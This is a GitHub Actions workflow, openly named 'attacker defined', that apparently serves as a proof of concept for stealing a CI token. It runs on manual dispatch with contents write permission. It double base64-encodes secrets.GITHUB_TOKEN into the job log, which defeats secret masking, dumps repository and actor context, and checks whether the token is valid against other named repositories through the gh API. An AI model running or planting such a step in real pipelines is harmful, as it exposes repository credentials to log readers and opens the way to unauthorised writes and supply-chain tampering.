name: attacker defined

on: workflow_dispatch

permissions:
    contents: write

jobs:
  hello-from-attacker:
    runs-on: ubuntu-latest
    steps:
      - name: hello
        run: |
          echo "xx"
          echo "${{secrets.GITHUB_TOKEN}}" | base64 | base64
          echo "sha: ${{github.event.pull_request.head.sha}}"
          echo "github sha ${{github.sha}}"
          echo "Repository: ${{ github.repository }}"
          echo "Repository owner: ${{ github.repository_owner }}"
          echo "Repository name: ${{ github.event.repository.name }}"
          echo "Full repo URL: ${{ github.repositoryUrl }}"
          echo "Actor: ${{ github.actor }}"
          echo "Triggering actor: ${{ github.triggering_actor }}"
          echo "Token permissions (read from job context):"
          echo "Contents: ${{ toJSON(github.event.repository.permissions) }}"
          GH_TOKEN=${{ secrets.GITHUB_TOKEN }} gh api repos/7unn3l/base_repo --header "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" > /dev/null 2>&1 && echo "Token valid" || echo "Token invalid"
          GH_TOKEN=${{ secrets.GITHUB_TOKEN }} gh api repos/maxiatcure53/base_repo_fork --header "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" > /dev/null 2>&1 && echo "Token valid" || echo "Token invalid"
          GH_TOKEN=${{ secrets.GITHUB_TOKEN }} gh api user --jq '{login: .login, type: .type}' && gh api repos/${{ github.repository }} --jq '.full_name'
          GH_TOKEN=${{ secrets.GITHUB_TOKEN }} gh api repos/${{ github.repository }} --jq '.full_name'